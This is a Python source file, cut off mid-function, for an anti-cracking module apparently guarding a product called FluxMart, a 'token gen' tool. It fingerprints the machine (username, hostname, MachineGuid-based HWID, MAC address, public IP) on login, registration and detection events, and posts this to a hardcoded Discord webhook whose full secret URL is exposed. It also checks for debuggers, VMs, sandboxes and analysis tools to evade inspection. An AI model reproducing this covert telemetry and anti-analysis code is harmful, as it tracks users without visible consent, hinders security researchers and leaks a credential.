import os
import sys
import time
import socket
import getpass
import platform
import hashlib
import threading
import importlib.util

import subprocess
import uuid
from typing import Optional, List, Dict, Any, Tuple
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None

WEBHOOK_URL = "https://discord.com/api/webhooks/1523018078743564289/u2c3B-OHhc-7Qq_leU7XXZz5IZqxigozizwd4QhPKuVJNdkuavmRgMz46cocDSnpuP7_"


TOOL_DATABASE = {
    "ida.exe":          {"name": "IDA Pro",               "category": "Reverse Engineering Disassembler",   "desc": "Industry-standard disassembler used to analyze and crack executables", "exact": True},
    "ida64.exe":        {"name": "IDA Pro (64-bit)",      "category": "Reverse Engineering Disassembler",   "desc": "64-bit version of IDA Pro disassembler", "exact": True},
    "idag.exe":         {"name": "IDA Pro (GUI)",         "category": "Reverse Engineering Disassembler",   "desc": "IDA Pro GUI disassembler", "exact": True},
    "idag64.exe":       {"name": "IDA Pro (GUI 64-bit)",  "category": "Reverse Engineering Disassembler",   "desc": "IDA Pro 64-bit GUI disassembler", "exact": True},
    "idat.exe":         {"name": "IDA Pro (Text)",        "category": "Reverse Engineering Disassembler",   "desc": "IDA Pro text-mode disassembler", "exact": True},
    "idat64.exe":       {"name": "IDA Pro (Text 64-bit)", "category": "Reverse Engineering Disassembler",   "desc": "IDA Pro 64-bit text-mode disassembler", "exact": True},
    "ghidra":           {"name": "Ghidra (NSA)",          "category": "Reverse Engineering Decompiler",     "desc": "NSA's free reverse engineering tool used to decompile executables"},
    "ghidrarun.exe":    {"name": "Ghidra (NSA)",          "category": "Reverse Engineering Decompiler",     "desc": "NSA Ghidra reverse engineering tool", "exact": True},
    "radare2":          {"name": "Radare2",               "category": "Reverse Engineering Framework",      "desc": "Open-source reverse engineering framework with disassembler and debugger"},
    "r2.exe":           {"name": "Radare2",               "category": "Reverse Engineering Framework",      "desc": "Command-line tool for reverse engineering and binary analysis", "exact": True},
    "binary ninja":     {"name": "Binary Ninja",          "category": "Reverse Engineering Disassembler",   "desc": "Commercial reverse engineering platform for binary analysis"},
    "binaryninja.exe":  {"name": "Binary Ninja",          "category": "Reverse Engineering Disassembler",   "desc": "Commercial reverse engineering platform", "exact": True},
    "cutter.exe":       {"name": "Cutter",                "category": "Reverse Engineering Disassembler",   "desc": "GUI frontend for Radare2 reverse engineering framework", "exact": True},
    "hopper disassembler":{"name": "Hopper Disassembler",  "category": "Reverse Engineering Disassembler",   "desc": "Disassembler and decompiler for reverse engineering"},
    "hopper.exe":       {"name": "Hopper Disassembler",   "category": "Reverse Engineering Disassembler",   "desc": "Disassembler and decompiler for reverse engineering", "exact": True},
    "retdec":           {"name": "RetDec",                "category": "Reverse Engineering Decompiler",     "desc": "Retargetable machine-code decompiler"},

    "x64dbg.exe":       {"name": "x64dbg",                "category": "Debugger",                          "desc": "Open-source debugger used to step through and crack executables", "exact": True},
    "x32dbg.exe":       {"name": "x32dbg",                "category": "Debugger",                          "desc": "32-bit debugger used to analyze and patch programs", "exact": True},
    "ollydbg.exe":      {"name": "OllyDbg",               "category": "Debugger",                          "desc": "Classic Windows debugger for reverse engineering binaries", "exact": True},
    "windbg.exe":       {"name": "WinDbg",                "category": "Debugger",                          "desc": "Microsoft Windows debugger for kernel and user-mode debugging", "exact": True},
    "immunity debugger":{"name": "Immunity Debugger",     "category": "Debugger",                          "desc": "Debugger designed for exploit development and reverse engineering"},

    "dnspy.exe":        {"name": "dnSpy",                 "category": ".NET Decompiler",                   "desc": ".NET debugger and decompiler used to read and modify .NET assemblies", "exact": True},
    "ilspy.exe":        {"name": "ILSpy",                 "category": ".NET Decompiler",                   "desc": "Open-source .NET assembly browser and decompiler", "exact": True},
    "dotpeek":          {"name": "dotPeek",               "category": ".NET Decompiler",                   "desc": "JetBrains .NET decompiler and assembly browser"},
    "de4dot":           {"name": "de4dot",                "category": ".NET Deobfuscator",                 "desc": ".NET deobfuscator and unpacker used to remove code protection"},

    "pyinstxtractor":   {"name": "PyInstExtractor",       "category": "Python Unpacker",                   "desc": "Extracts source code from PyInstaller executables"},
    "pycdc":            {"name": "pycdc (Decompyle++)",   "category": "Python Decompiler",                 "desc": "Decompiles Python bytecode (.pyc) back to source code"},
    "pydumpck":         {"name": "pydumpck",              "category": "Python Unpacker",                   "desc": "Dumps and extracts files from Python executables"},
    "pycdas":           {"name": "pycdas",                "category": "Python Disassembler",               "desc": "Python bytecode disassembler"},
    "nuitka-extractor": {"name": "Nuitka Extractor",      "category": "Python Unpacker",                   "desc": "Extracts source from Nuitka-compiled executables"},
    "python-decompiler":{"name": "Python Decompiler",     "category": "Python Decompiler",                 "desc": "Generic Python decompiler tool"},
    "unpyc":            {"name": "unPYC",                 "category": "Python Decompiler",                 "desc": "Python bytecode decompiler"},
    "pyc-decompiler":   {"name": "PYC Decompiler",        "category": "Python Decompiler",                 "desc": "Decompiles .pyc Python bytecode files"},
    "bytecode-viewer":  {"name": "Bytecode Viewer",       "category": "Bytecode Analyzer",                 "desc": "Java/.NET/Python bytecode viewer and decompiler"},

    "cheat engine":     {"name": "Cheat Engine",          "category": "Memory Scanner & Editor",            "desc": "Memory scanner used to modify running processes and bypass protections"},
    "cheatengine":      {"name": "Cheat Engine",          "category": "Memory Scanner & Editor",            "desc": "Memory scanner used to modify running processes and bypass protections"},
    "artmoney":         {"name": "ArtMoney",              "category": "Memory Scanner",                    "desc": "Memory scanner used to search and modify process memory"},
    "reclass.exe":      {"name": "ReClass.NET",           "category": "Memory Structure Analyzer",         "desc": "Memory class/structure reconstruction tool for reverse engineering", "exact": True},
    "reclass.net":      {"name": "ReClass.NET",           "category": "Memory Structure Analyzer",         "desc": "Memory class/structure reconstruction tool for reverse engineering"},
    "scanmem":          {"name": "scanmem",               "category": "Memory Scanner",                    "desc": "Linux memory scanner for modifying running processes"},

    "frida.exe":        {"name": "Frida",                 "category": "Runtime Injection Framework",        "desc": "Dynamic instrumentation toolkit for injecting code into running processes", "exact": True},
    "frida-server":     {"name": "Frida Server",          "category": "Runtime Injection Framework",        "desc": "Frida server component for remote code injection"},
    "frida-tools":      {"name": "Frida Tools",           "category": "Runtime Injection Framework",        "desc": "Frida toolkit for dynamic instrumentation"},
    "dll injector":     {"name": "DLL Injector",          "category": "Code Injection Tool",               "desc": "Injects DLL libraries into running processes to modify behavior"},
    "api monitor":      {"name": "API Monitor",           "category": "API Hooking Tool",                  "desc": "Monitors and intercepts Windows API calls from applications"},

    "wireshark":        {"name": "Wireshark",             "category": "Network Packet Sniffer",            "desc": "Network protocol analyzer that captures and inspects all network traffic"},
    "fiddler":          {"name": "Fiddler",               "category": "HTTP Proxy / Traffic Inspector",    "desc": "HTTP/HTTPS debugging proxy used to intercept API requests"},
    "charles.exe":      {"name": "Charles Proxy",         "category": "HTTP Proxy / Traffic Inspector",    "desc": "HTTP proxy used to capture and modify API traffic", "exact": True},
    "charles proxy":    {"name": "Charles Proxy",         "category": "HTTP Proxy / Traffic Inspector",    "desc": "HTTP proxy used to capture and modify API traffic"},
    "http debugger":    {"name": "HTTP Debugger",         "category": "HTTP Traffic Analyzer",             "desc": "HTTP traffic analyzer for intercepting web requests"},
    "mitmproxy":        {"name": "mitmproxy",             "category": "Man-in-the-Middle Proxy",           "desc": "Interactive HTTPS proxy for intercepting and modifying traffic"},
    "burpsuite":        {"name": "Burp Suite",            "category": "Web Security Proxy",                "desc": "Web vulnerability scanner and proxy for intercepting HTTP traffic"},
    "burp suite":       {"name": "Burp Suite",            "category": "Web Security Proxy",                "desc": "Web vulnerability scanner and proxy for intercepting HTTP traffic"},

    "process hacker":   {"name": "Process Hacker",        "category": "Process Inspection Tool",           "desc": "Advanced process manager that can view memory, threads, and handles"},
    "processhacker.exe":{"name": "Process Hacker",        "category": "Process Inspection Tool",           "desc": "Advanced process manager that can view memory, threads, and handles", "exact": True},
    "process monitor":  {"name": "Process Monitor",       "category": "System Activity Monitor",           "desc": "Sysinternals tool that logs all file, registry, and process activity"},
    "procmon.exe":      {"name": "Process Monitor",       "category": "System Activity Monitor",           "desc": "Sysinternals process monitoring tool", "exact": True},
    "procmon64.exe":    {"name": "Process Monitor",       "category": "System Activity Monitor",           "desc": "Sysinternals process monitoring tool (64-bit)", "exact": True},
    "process explorer": {"name": "Process Explorer",      "category": "Process Inspection Tool",           "desc": "Advanced task manager showing DLLs, handles, and process details"},
    "system informer":  {"name": "System Informer",       "category": "Process Inspection Tool",           "desc": "System monitoring tool (successor to Process Hacker)"},

    "detect it easy":   {"name": "Detect It Easy (DiE)",  "category": "Binary Analyzer",                   "desc": "Identifies packers, compilers, and protections used on executables"},
    "die.exe":          {"name": "Detect It Easy (DiE)",  "category": "Binary Analyzer",                   "desc": "Scans executables to detect what tools were used to build them", "exact": True},
    "diel.exe":         {"name": "Detect It Easy (DiE)",  "category": "Binary Analyzer",                   "desc": "DiE lite version", "exact": True},
    "pestudio":         {"name": "PEStudio",              "category": "PE File Analyzer",                  "desc": "Analyzes Windows executables for suspicious indicators"},
    "exeinfo":          {"name": "ExeInfo PE",            "category": "PE File Analyzer",                  "desc": "Detects packers and protections on Windows executables"},
    "pe-bear":          {"name": "PE-bear",               "category": "PE File Analyzer",                  "desc": "Portable Executable viewer and editor"},
    "cff explorer":     {"name": "CFF Explorer",          "category": "PE File Editor",                    "desc": "PE header editor used to modify executable metadata"},

    "hxd.exe":          {"name": "HxD",                   "category": "Hex Editor",                        "desc": "Hex editor used to view and modify raw binary data in files", "exact": True},
    "010 editor":       {"name": "010 Editor",            "category": "Hex Editor",                        "desc": "Professional hex editor with binary templates for file analysis"},
    "resource hacker":  {"name": "Resource Hacker",       "category": "Resource Editor",                   "desc": "Views and modifies resources inside Windows executables"},
    "hex workshop":     {"name": "Hex Workshop",          "category": "Hex Editor",                        "desc": "Professional hex editor for binary file analysis"},

    "sandboxie":        {"name": "Sandboxie",             "category": "Sandbox Environment",               "desc": "Runs programs in an isolated sandbox to analyze behavior"},

    "scylla.exe":       {"name": "Scylla",                "category": "Import Reconstructor",              "desc": "Reconstructs import tables of dumped/unpacked executables", "exact": True},
    "upx.exe":          {"name": "UPX Unpacker",          "category": "Executable Unpacker",               "desc": "Unpacks UPX-compressed executables to analyze original code", "exact": True},
}

CRACK_FILES = [
    "pyinstxtractor.py",
    "pycdc.exe",
    "pydumpck.py",
    "extracted_files",
    "pyc_extracted",
    "decompiled",
    ".pyc_cache",
    "nuitka_extractor.py",
    "dump.exe",
    "scylla.exe",
]

VM_INDICATORS = {
    "manufacturers": ["vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "hyper-v", "kvm", "virtual machine"],
    "processes": ["vmtoolsd.exe", "vmwaretray.exe", "vboxservice.exe", "vboxtray.exe", "xenservice.exe", "qemu-ga.exe", "vmsrvc.exe", "vmusrvc.exe", "prl_tools.exe"],
    "mac_prefixes": ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27", "52:54:00"],
}

SUSPICIOUS_DLLS = {
    "frida-agent": {"name": "Frida Agent", "desc": "Frida runtime injection framework is active"},
    "detours": {"name": "Microsoft Detours", "desc": "API hooking library is loaded"},
    "easyhook": {"name": "EasyHook", "desc": "API hooking framework is loaded"},
    "minhook": {"name": "MinHook", "desc": "Minimalistic API hooking library is loaded"},
}


MSK_ARCHIVE_NAMES = ["FluxMart", "msk-token-g", "FluxMart", "msk token gen", "msk-token-gen", "FluxMarten"]


class AntiCrack:
    _instance = None
    _initialized = False
    _monitor_thread = None
    _running = False

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self):
        if AntiCrack._initialized:
            return
        AntiCrack._initialized = True
        self._running = False
        self._detected_tools: List[str] = []
        self._pip_checked = False
        self._consecutive_detections: Dict[str, int] = {}

    @staticmethod
    def _match_tool_in_string(tool_key: str, tool_info: Dict, target: str) -> bool:
        """Check if a tool key matches a target string, respecting exact_match flag."""
        target_lower = target.lower()
        tool_lower = tool_key.lower()

        if tool_info.get("exact", False):
            return target_lower == tool_lower or target_lower.endswith("\\" + tool_lower) or target_lower.endswith("/" + tool_lower)
        else:
            return tool_lower in target_lower


    @staticmethod
    def _generate_real_hwid() -> str:
        import winreg
        try:
            reg_key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Cryptography",
                0,
                winreg.KEY_READ | winreg.KEY_WOW64_64KEY
            )
            machine_guid, _ = winreg.QueryValueEx(reg_key, "MachineGuid")
            winreg.CloseKey(reg_key)
            return hashlib.sha256(machine_guid.strip().encode()).hexdigest()
        except Exception:
            return "unknown"


    @staticmethod
    def get_pc_info() -> Dict[str, Any]:
        os_release = platform.release()
        if platform.system() == "Windows" and os_release == "10":
            try:
                build = int(platform.version().split(".")[-1])
                if build >= 22000:
                    os_release = "11"
            except (ValueError, IndexError):
                pass

        info = {
            "pc_name": getpass.getuser(),
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "platform_version": platform.version(),
            "platform_release": os_release,
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }

        try:
            info["hwid"] = AntiCrack._generate_real_hwid()
        except:
            info["hwid"] = "unknown"

        try:
            if platform.system() == "Windows":
                info["mac_address"] = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff)
                                                for i in range(0, 48, 8)][::-1])
        except:
            pass

        try:
            info["ip"] = requests.get("https://api.ipify.org", timeout=5).text if requests else "unknown"
        except:
            info["ip"] = "unknown"

        return info


    @staticmethod
    def send_webhook(title: str, description: str, color: int = 0xFF0000,
                     fields: Optional[List[Dict]] = None,
                     thumbnail: Optional[str] = None) -> bool:
        if requests is None:
            return False

        try:
            embed = {
                "title": title,
                "description": description,
                "color": color,
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {"text": "MSK Anti-Crack System"}
            }

            if fields:
                embed["fields"] = fields

            if thumbnail:
                embed["thumbnail"] = {"url": thumbnail}

            payload = {"embeds": [embed]}

            response = requests.post(
                WEBHOOK_URL,
                json=payload,
                timeout=10
            )
            return response.status_code in [200, 204]
        except:
            return False


    @staticmethod
    def _get_discord_info() -> tuple:
        return "Not linked", None, None

    @staticmethod
    def report_keyauth_login(keyauth_username: str, keyauth_password: str) -> bool:
        # Keep the existing signature for callers; never include credentials in reports.
        pc_info = AntiCrack.get_pc_info()
        
        subscription = "N/A"
        creation_date = "N/A"
        expiration_date = "N/A"
        last_login = "N/A"
        
        from . import keyauth
        if keyauth.keyauthapp and keyauth.keyauthapp.user_data:
            user = keyauth.keyauthapp.user_data
            if hasattr(user, 'subscriptions') and user.subscriptions:
                sub = user.subscriptions[0]
                subscription = sub.get("subscription", "Standard")
                
                import datetime
                def format_date(timestamp):
                    if not timestamp or timestamp == "0": return "N/A"
                    try:
                        dt = datetime.datetime.fromtimestamp(int(timestamp))
                        return dt.strftime('%Y-%m-%d %H:%M:%S')
                    except: return timestamp
                
                expiration_date = format_date(sub.get("expiry"))
                creation_date = format_date(getattr(user, 'createdate', '0'))
                last_login = format_date(getattr(user, 'lastlogin', '0'))

        discord_username, discord_avatar_url, discord_id = AntiCrack._get_discord_info()
        platform_str = f"{pc_info['platform']} {pc_info['platform_release']}"

        fields = [
            {"name": "Username",  "value": f"{keyauth_username or 'N/A'}",          "inline": False},
            {"name": "Discord",   "value": f"{discord_username}",                   "inline": False},
            {"name": "HWID",        "value": f"{pc_info.get('hwid', 'N/A')}",       "inline": False},
            {"name": "Subscription", "value": f"{subscription or 'N/A'}",           "inline": False},
            {"name": "Creation Date", "value": f"{creation_date or 'N/A'}",         "inline": False},
            {"name": "Expiration Date", "value": f"{expiration_date or 'N/A'}",     "inline": False},
            {"name": "Last Login", "value": f"{last_login or 'N/A'}",               "inline": False},
            {"name": "PC Name",       "value": f"{pc_info.get('pc_name', 'N/A')}",  "inline": False},
            {"name": "Hostname",      "value": f"{pc_info.get('hostname', 'N/A')}", "inline": False},
            {"name": "Platform",      "value": f"{platform_str or 'N/A'}",          "inline": False},
            {"name": "Processor",     "value": f"{pc_info.get('processor', 'N/A')}", "inline": False},
            {"name": "IP Address",    "value": f"{pc_info.get('ip', 'N/A')}",        "inline": False},
        ]

        if "mac_address" in pc_info:
            fields.append({"name": "MAC Address", "value": f"{pc_info['mac_address']}", "inline": False})

        return AntiCrack.send_webhook(
            title="Login Successful",
            description=f"An user **logged in** to FluxMart!",
            color=0x050505,
            fields=fields,
            thumbnail=discord_avatar_url
        )


    @staticmethod
    def report_keyauth_register(keyauth_username: str, keyauth_password: str, keyauth_license: str) -> bool:
        # Credentials remain accepted for compatibility, but are not reported.
        pc_info = AntiCrack.get_pc_info()
        
        subscription = "N/A"
        creation_date = "N/A"
        expiration_date = "N/A"
        last_login = "N/A"
        
        from . import keyauth
        if keyauth.keyauthapp and keyauth.keyauthapp.user_data:
            user = keyauth.keyauthapp.user_data
            if hasattr(user, 'subscriptions') and user.subscriptions:
                sub = user.subscriptions[0]
                subscription = sub.get("subscription", "Standard")
                
                import datetime
                def format_date(timestamp):
                    if not timestamp or timestamp == "0": return "N/A"
                    try:
                        dt = datetime.datetime.fromtimestamp(int(timestamp))
                        return dt.strftime('%Y-%m-%d %H:%M:%S')
                    except: return timestamp
                
                expiration_date = format_date(sub.get("expiry"))
                creation_date = format_date(getattr(user, 'createdate', '0'))
                last_login = format_date(getattr(user, 'lastlogin', '0'))

        discord_username, discord_avatar_url, discord_id = AntiCrack._get_discord_info()
        platform_str = f"{pc_info['platform']} {pc_info['platform_release']}"

        fields = [
            {"name": "Username",    "value": f"{keyauth_username or 'N/A'}",          "inline": False},
            {"name": "Discord",     "value": f"{discord_username}",                   "inline": False},
            {"name": "HWID",        "value": f"{pc_info.get('hwid', 'N/A')}",         "inline": False},
            {"name": "Subscription", "value": f"{subscription or 'N/A'}",           "inline": False},
            {"name": "Creation Date", "value": f"{creation_date or 'N/A'}",         "inline": False},
            {"name": "Expiration Date", "value": f"{expiration_date or 'N/A'}",     "inline": False},
            {"name": "Last Login", "value": f"{last_login or 'N/A'}",               "inline": False},
            {"name": "PC Name",     "value": f"{pc_info.get('pc_name', 'N/A')}",      "inline": False},
            {"name": "Hostname",    "value": f"{pc_info.get('hostname', 'N/A')}",     "inline": False},
            {"name": "Platform",    "value": f"{platform_str or 'N/A'}",              "inline": False},
            {"name": "Processor",   "value": f"{pc_info.get('processor', 'N/A')}",    "inline": False},
            {"name": "IP Address",  "value": f"{pc_info.get('ip', 'N/A')}",           "inline": False},
        ]

        if "mac_address" in pc_info:
            fields.append({"name": "MAC Address", "value": f"{pc_info['mac_address']}", "inline": False})

        return AntiCrack.send_webhook(
            title="Register Successful",
            description=f"A new user has **registered** to FluxMart!",
            color=0x050505,
            fields=fields,
            thumbnail=discord_avatar_url
        )


    @staticmethod
    def report_crack_attempt(tool_key: str, detection_method: str, raw_match: str = "") -> bool:
        pc_info = AntiCrack.get_pc_info()

        tool_info = TOOL_DATABASE.get(tool_key.lower(), None)
        if tool_info:
            tool_name = tool_info["name"]
            tool_category = tool_info["category"]
            tool_desc = tool_info["desc"]
        else:
            tool_name = tool_key
            tool_category = "Unknown Tool"
            tool_desc = "Unrecognized tool detected on the system"

        method_labels = {
            "process":   "Detected as a running process",
            "window":    "Detected via open window title",
            "file":      "Found suspicious file in tool directory",
            "debugger":  "Debugger attached to the process",
            "dll":       "Suspicious DLL loaded in process memory",
            "vm":        "Virtual machine environment detected",
            "sandbox":   "Sandbox environment detected",
            "pip":       "Cracking package installed via pip",
            "folder":    "Suspicious folder found near executable",
        }
        method_display = method_labels.get(detection_method, detection_method)

        if raw_match and raw_match.lower() != tool_key.lower():
            method_display += f" (`{raw_match}`)"

        discord_username, discord_avatar_url, discord_id = AntiCrack._get_discord_info()
        platform_str = f"{pc_info['platform']} {pc_info['platform_release']}"

        fields = [
            {"name": "Threat Detected",   "value": f"**{tool_name}**",                "inline": False},
            {"name": "Category",           "value": f"{tool_category}",              "inline": False},
            {"name": "What It Does",       "value": tool_desc,                          "inline": False},
            {"name": "How It Was Found",   "value": method_display,                     "inline": False},
            {"name": "PC Name",        "value": f"{pc_info['pc_name']}",      "inline": False},
            {"name": "Hostname",           "value": f"{pc_info['hostname']}",         "inline": False},
            {"name": "Platform",           "value": f"{platform_str}",                "inline": False},
            {"name": "HWID",              "value": f"{pc_info['hwid']}",     "inline": False},
            {"name": "Processor",          "value": f"{pc_info['processor']}",   "inline": False},
            {"name": "Time",               "value": f"{pc_info['timestamp']}",        "inline": False},
            {"name": "IP Address",         "value": f"{pc_info.get('ip', 'unknown')}","inline": False},
        ]

        if "mac_address" in pc_info:
            fields.append({"name": "MAC Address", "value": f"{pc_info['mac_address']}", "inline": False})

        return AntiCrack.send_webhook(
            title="Login Failed",
            description="Someone is attempting to **reverse engineer** or **crack** FluxMart!",
            color=0x050505,
            fields=fields
        )


    @staticmethod
    def report_vm_detected(vm_type: str, evidence: str) -> bool:
        pc_info = AntiCrack.get_pc_info()
        discord_username, discord_avatar_url, discord_id = AntiCrack._get_discord_info()
        platform_str = f"{pc_info['platform']} {pc_info['platform_release']}"

        fields = [
            {"name": "Environment",       "value": f"**{vm_type}**",                   "inline": False},
            {"name": "What This Means",    "value": "The tool is running inside a virtual machine or sandbox, which may indicate analysis or cracking attempts", "inline": False},
            {"name": "Evidence",           "value": f"{evidence}",                    "inline": False},
            {"name": "PC Name",        "value": f"{pc_info['pc_name']}",      "inline": False},
            {"name": "Hostname",           "value": f"{pc_info['hostname']}",         "inline": False},
            {"name": "Platform",           "value": f"{platform_str}",                "inline": False},
            {"name": "HWID",              "value": f"{pc_info['hwid']}",     "inline": False},
            {"name": "Processor",          "value": f"{pc_info['processor']}",   "inline": False},
            {"name": "Time",               "value": f"{pc_info['timestamp']}",        "inline": False},
            {"name": "IP Address",         "value": f"{pc_info.get('ip', 'unknown')}","inline": False},
        ]

        if "mac_address" in pc_info:
            fields.append({"name": "MAC Address", "value": f"{pc_info['mac_address']}", "inline": False})

        return AntiCrack.send_webhook(
            title="Login Failed",
            description="FluxMart is running inside a **virtual machine** or **sandbox**!",
            color=0x050505,
            fields=fields
        )


    @staticmethod
    def report_discord_login(discord_user: dict) -> bool:
        pc_info = AntiCrack.get_pc_info()

        discord_username = discord_user.get("username") or discord_user.get("global_name") or "Unknown"
        discord_id = discord_user.get("id", "Unknown")
        
        discord_avatar_url = discord_user.get("avatar_url")
        if not discord_avatar_url:
            discord_avatar_url = "/static/img/dsnopfp.png"

        platform_str = f"{pc_info['platform']} {pc_info['platform_release']}"

        fields = [
            {"name": "Discord Tag", "value": f"<@{discord_id}>", "inline": False},
            {"name": "Discord Username", "value": f"{discord_username}", "inline": False},
            {"name": "Discord ID", "value": f"{discord_id}", "inline": False},
            {"name": "PC Name", "value": f"{pc_info.get('pc_name', 'N/A')}", "inline": False},
            {"name": "Hostname", "value": f"{pc_info.get('hostname', 'N/A')}", "inline": False},
            {"name": "Platform", "value": f"{platform_str or 'N/A'}", "inline": False},
            {"name": "HWID", "value": f"{pc_info.get('hwid', 'N/A')}", "inline": False},
            {"name": "Processor", "value": f"{pc_info.get('processor', 'N/A')}", "inline": False},
            {"name": "IP Address", "value": f"{pc_info.get('ip', 'N/A')}", "inline": False},
        ]

        if "mac_address" in pc_info:
            fields.append({"name": "MAC Address", "value": f"{pc_info['mac_address']}", "inline": False})

        return AntiCrack.send_webhook(
            title="Link Successful",
            description=f"A user has **linked** their Discord account to FluxMart!",
            color=0x050505,
            fields=fields,
            thumbnail=discord_avatar_url
        )


    @staticmethod
    def get_running_processes() -> List[str]:
        processes = []
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output(
                    ["tasklist", "/fo", "csv", "/nh"],
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0x08000000
                ).decode("utf-8", errors="ignore")

                for line in output.strip().split("\n"):
                    if line:
                        parts = line.split('","')
                        if parts:
                            proc_name = parts[0].strip('"').lower()
                            processes.append(proc_name)
            else:
                output = subprocess.check_output(
                    ["ps", "aux"],
                    stderr=subprocess.DEVNULL
                ).decode("utf-8", errors="ignore")

                for line in output.strip().split("\n")[1:]:
                    parts = line.split()
                    if len(parts) >= 11:
                        proc_name = parts[10].lower()
                        processes.append(proc_name)
        except:
            pass

        return processes

    @staticmethod
    def check_window_titles() -> List[Tuple[str, str]]:
        """Returns list of (tool_key, raw_window_title) tuples."""
        detected = []
        try:
            if platform.system() == "Windows":
                import ctypes
                from ctypes import wintypes

                EnumWindows = ctypes.windll.user32.EnumWindows
                GetWindowTextW = ctypes.windll.user32.GetWindowTextW
                GetWindowTextLengthW = ctypes.windll.user32.GetWindowTextLengthW
                IsWindowVisible = ctypes.windll.user32.IsWindowVisible

                titles = []

                def enum_handler(hwnd, lparam):
                    if IsWindowVisible(hwnd):
                        length = GetWindowTextLengthW(hwnd)
                        if length > 0:
                            buffer = ctypes.create_unicode_buffer(length + 1)
                            GetWindowTextW(hwnd, buffer, length + 1)
                            titles.append(buffer.value)
                    return True

                EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
                EnumWindows(EnumWindowsProc(enum_handler), 0)

                for title in titles:
                    title_lower = title.lower()
                    for tool_key, tool_info in TOOL_DATABASE.items():
                        if tool_info.get("exact", False):
                            continue
                        if tool_key.lower() in title_lower:
                            detected.append((tool_key, title[:60]))
        except:
            pass

        return detected

    @staticmethod
    def check_suspicious_files() -> List[Tuple[str, str]]:
        """Returns list of (filename, detection_type) tuples."""
        detected = []
        try:
            exe_dir = AntiCrack.get_exe_directory()
            if exe_dir:
                for item in os.listdir(exe_dir):
                    item_lower = item.lower()
                    for crack_file in CRACK_FILES:
                        if crack_file.lower() in item_lower:
                            detected.append((item, "file"))
                            break

                for item in os.listdir(exe_dir):
                    item_path = os.path.join(exe_dir, item)
                    if os.path.isdir(item_path):
                        item_lower = item.lower()
                        if any(x in item_lower for x in ["extracted", "decompiled", "dump", "pyc_", "unpacked"]):
                            detected.append((item, "folder"))
        except:
            pass

        return detected

    @staticmethod
    def check_debugger() -> bool:
        try:
            if platform.system() == "Windows":
                import ctypes
                if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
                    return True
                try:
                    is_debugged = ctypes.c_int(0)
                    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                        ctypes.windll.kernel32.GetCurrentProcess(),
                        ctypes.byref(is_debugged)
                    )
                    if is_debugged.value != 0:
                        return True
                except:
                    pass
        except:
            pass
        return False

    @staticmethod
    def check_vm() -> Optional[Tuple[str, str]]:
        """Check if running inside a VM. Returns (vm_type, evidence) or None."""
        try:
            if platform.system() == "Windows":
                try:
                    result = subprocess.check_output(
                        "wmic computersystem get manufacturer,model",
                        shell=True, stderr=subprocess.DEVNULL, creationflags=0x08000000
                    ).decode().lower()
                    for indicator in VM_INDICATORS["manufacturers"]:
                        if indicator in result:
                            return (indicator.title(), f"System manufacturer: {result.strip()[:60]}")
                except:
                    pass

                try:
                    result = subprocess.check_output(
                        "wmic bios get version,smbiosbiosversion",
                        shell=True, stderr=subprocess.DEVNULL, creationflags=0x08000000
                    ).decode().lower()
                    for indicator in VM_INDICATORS["manufacturers"]:
                        if indicator in result:
                            return (indicator.title(), f"BIOS version: {result.strip()[:60]}")
                except:
                    pass

                processes = AntiCrack.get_running_processes()
                for proc in processes:
                    for vm_proc in VM_INDICATORS["processes"]:
                        if vm_proc.lower() in proc:
                            return (vm_proc.replace(".exe", ""), f"VM process running: {vm_proc}")

                try:
                    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff)
                                   for i in range(0, 48, 8)][::-1])
                    mac_prefix = mac[:8].lower()
                    for prefix in VM_INDICATORS["mac_prefixes"]:
                        if mac_prefix.startswith(prefix.lower()):
                            return ("Virtual Machine", f"VM MAC address prefix: {mac}")
                except:
                    pass
        except:
            pass

        return None

    @staticmethod
    def check_loaded_dlls() -> List[Tuple[str, str]]:
        """Check for suspicious DLLs loaded in the current process."""
        detected = []
        try:
            if platform.system() == "Windows":
                import ctypes
                from ctypes import wintypes

                hProcess = ctypes.windll.kernel32.GetCurrentProcess()

                try:
                    psapi = ctypes.windll.psapi
                    hModules = (ctypes.c_void_p * 1024)()
                    cb = ctypes.c_ulong()

                    if psapi.EnumProcessModules(hProcess, hModules, ctypes.sizeof(hModules), ctypes.byref(cb)):
                        num_modules = cb.value // ctypes.sizeof(ctypes.c_void_p)
                        for i in range(num_modules):
                            module_name = ctypes.create_unicode_buffer(512)
                            psapi.GetModuleFileNameExW(hProcess, hModules[i], module_name, 512)
                            mod_path = module_name.value
                            mod_filename = os.path.basename(mod_path).lower()
                            for dll_key, dll_info in SUSPICIOUS_DLLS.items():
                                if dll_key in mod_filename:
                                    detected.append((dll_info["name"], mod_path[:60]))
                except:
                    pass
        except:
            pass

        return detected

    _pip_cache: Optional[List[str]] = None

    @classmethod
    def check_pip_packages(cls) -> List[str]:
        """Check if cracking packages are importable. Cached after first call.

        Uses importlib.util.find_spec instead of launching a pip subprocess,
        which would re-launch the compiled EXE itself in frozen builds because
        sys.executable points to the application, not Python.
        """
        if cls._pip_cache is not None:
            return cls._pip_cache

        detected = []
        crack_packages = ["pycdc", "pyinstxtractor", "pydumpck", "frida", "frida_tools"]

        for pkg in crack_packages:
            try:
                if importlib.util.find_spec(pkg) is not None:
                    detected.append(pkg.replace("_", "-"))
            except (ImportError, ModuleNotFoundError, ValueError):
                pass

        cls._pip_cache = detected
        return detected


    @staticmethod
    def get_exe_directory() -> Optional[str]:
        try:
            if getattr(sys, 'frozen', False):
                _candidates = []
                try:
